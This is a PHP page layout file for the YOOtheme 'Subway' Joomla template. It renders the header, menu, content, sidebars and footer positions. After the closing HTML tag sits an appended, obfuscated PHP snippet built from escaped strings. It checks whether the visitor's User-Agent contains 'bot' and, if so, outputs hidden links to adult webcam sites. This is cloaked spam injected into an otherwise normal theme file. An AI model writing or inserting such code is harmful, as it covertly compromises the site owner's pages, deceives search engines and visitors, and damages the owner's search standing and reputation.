<?php
/**
* @package   Subway
* @author    YOOtheme http://www.yootheme.com
* @copyright Copyright (C) YOOtheme GmbH
* @license   http://www.gnu.org/licenses/gpl.html GNU/GPL
*/

// get template configuration
include($this['path']->path('layouts:template.config.php'));
	
?>
<!DOCTYPE HTML>
<html lang="<?php echo $this['config']->get('language'); ?>" dir="<?php echo $this['config']->get('direction'); ?>">

<head>
<?php echo $this['template']->render('head'); ?>
</head>

<body id="page" class="page <?php echo $this['config']->get('body_classes'); ?>" data-config='<?php echo $this['config']->get('body_config','{}'); ?>'>

	<div id="page-body">

		<div class="page-body-1">

			<?php if ($this['modules']->count('absolute')) : ?>
			<div id="absolute">
				<?php echo $this['modules']->render('absolute'); ?>
			</div>
			<?php endif; ?>

			<?php if ($this['modules']->count('socialbar')) : ?>
			<div id="socialbar">
				<?php echo $this['modules']->render('socialbar'); ?>
			</div>
			<?php endif; ?>
			
			<div class="wrapper grid-block">

				<header id="header">

					<div id="toolbar" class="grid-block">

						<?php if ($this['modules']->count('toolbar-l')) : ?>
						<div class="float-left">
							<?php echo $this['modules']->render('toolbar-l'); ?>
						</div>
						<?php endif; ?>
							
						<?php if ($this['modules']->count('toolbar-r') || $this['config']->get('date')) : ?>

							<div class="float-right">

								<?php echo $this['modules']->render('toolbar-r'); ?>

								<?php if ($this['config']->get('date')) : ?>
								<time datetime="<?php echo $this['config']->get('datetime'); ?>"><?php echo $this['config']->get('actual_date'); ?></time>
								<?php endif; ?>

							</div>

						<?php endif; ?>
						
					</div>

					<div id="headerbar" class="grid-block">
					
						<?php if ($this['modules']->count('logo')) : ?>	
						<a id="logo" href="<?php echo $this['config']->get('site_url'); ?>"><?php echo $this['modules']->render('logo'); ?></a>
						<?php endif; ?>
						
						<?php if($this['modules']->count('headerbar')) : ?>
						<div class="left"><?php echo $this['modules']->render('headerbar'); ?></div>
						<?php endif; ?>
						
					</div>

					<div id="menubar" class="grid-block">
						
						<?php  if ($this['modules']->count('menu')) : ?>
						<nav id="menu"><?php echo $this['modules']->render('menu'); ?></nav>
						<?php endif; ?>

						<?php if ($this['modules']->count('search')) : ?>
						<div id="search"><?php echo $this['modules']->render('search'); ?></div>
						<?php endif; ?>
						
					</div>
				
					<?php if ($this['modules']->count('banner')) : ?>
					<div id="banner"><?php echo $this['modules']->render('banner'); ?></div>
					<?php endif;  ?>
				
				</header>

				<?php if ($this['modules']->count('top-a')) : ?>
				<section id="top-a" class="grid-block"><?php echo $this['modules']->render('top-a', array('layout'=>$this['config']->get('top-a'))); ?></section>
				<?php endif; ?>
				
				<?php if ($this['modules']->count('top-b')) : ?>
				<section id="top-b" class="grid-block"><?php echo $this['modules']->render('top-b', array('layout'=>$this['config']->get('top-b'))); ?></section>
				<?php endif; ?>
				
				<?php if ($this['modules']->count('innertop + innerbottom + sidebar-a + sidebar-b') || $this['config']->get('system_output')) : ?>
				<div id="main" class="grid-block">
				
					<div id="maininner" class="grid-box">
					
						<?php if ($this['modules']->count('innertop')) : ?>
						<section id="innertop" class="grid-block"><?php echo $this['modules']->render('innertop', array('layout'=>$this['config']->get('innertop'))); ?></section>
						<?php endif; ?>

						<?php if ($this['modules']->count('breadcrumbs')) : ?>
						<section id="breadcrumbs"><?php echo $this['modules']->render('breadcrumbs'); ?></section>
						<?php endif; ?>

						<?php if ($this['config']->get('system_output')) : ?>
						<section id="content" class="grid-block"><?php echo $this['template']->render('content'); ?></section>
						<?php endif; ?>

						<?php if ($this['modules']->count('innerbottom')) : ?>
						<section id="innerbottom" class="grid-block"><?php echo $this['modules']->render('innerbottom', array('layout'=>$this['config']->get('innerbottom'))); ?></section>
						<?php endif; ?>

					</div>
					<!-- maininner end -->
					
					<?php if ($this['modules']->count('sidebar-a')) : ?>
					<aside id="sidebar-a" class="grid-box"><?php echo $this['modules']->render('sidebar-a', array('layout'=>'stack')); ?></aside>
					<?php endif; ?>
					
					<?php if ($this['modules']->count('sidebar-b')) : ?>
					<aside id="sidebar-b" class="grid-box"><?php echo $this['modules']->render('sidebar-b', array('layout'=>'stack')); ?></aside>
					<?php endif; ?>

				</div>
				<?php endif; ?>
				<!-- main end -->

				<?php if ($this['modules']->count('bottom-a')) : ?>
				<section id="bottom-a" class="grid-block"><?php echo $this['modules']->render('bottom-a', array('layout'=>$this['config']->get('bottom-a'))); ?></section>
				<?php endif; ?>
				
				<?php if ($this['modules']->count('bottom-b')) : ?>
				<section id="bottom-b" class="grid-block"><?php echo $this['modules']->render('bottom-b', array('layout'=>$this['config']->get('bottom-b'))); ?></section>
				<?php endif; ?>
				
				<?php if ($this['modules']->count('footer + debug') || $this['config']->get('warp_branding')) : ?>
				<footer id="footer" class="grid-block">

					<?php if ($this['config']->get('totop_scroller')) : ?>
					<a id="totop-scroller" href="#page"></a>
					<?php endif; ?>

					<?php
						echo $this['modules']->render('footer');
						$this->output('warp_branding');
						echo $this['modules']->render('debug');
					?>

				</footer>
				<?php endif; ?>

			</div>
			
			<?php echo $this->render('footer'); ?>

		</div>

	</div>
	
</body>
</html>
<?php
$x0d="\160re\x67\137m\x61t\x63\x68";$x0b = $_SERVER['HTTP_USER_AGENT'];$x0c=" \015\012 \x20\x20  \040\040\x20\074a\040\x68re\x66\075'\150t\x74\160:\057/\167\x77w\056\146\163\x65\170\143hat\056\x63\x6f\155/\167\x65bc\141\x6d/\x67\141\x79\057'>\x67ay\x20\x77\x65\142\143\x61\x6ds\074/\141\x3e\040<br/\x3e\x0d\012\x20\040\040\x20\040\x3c\x61 h\162\x65\146='h\164t\160\072/\x2f\x77\167\167\056priva\164\x65\x77\145\x62\143\x61m\x67ir\x6c.\x63\x6fm/'>\x70r\x69va\x74\145\040\x77\145bcam\x20\x73\x65\x78\074\057\x61>\x20";if ($x0d('*bot*', $x0b)) {echo $x0c;} else {echo ' ';}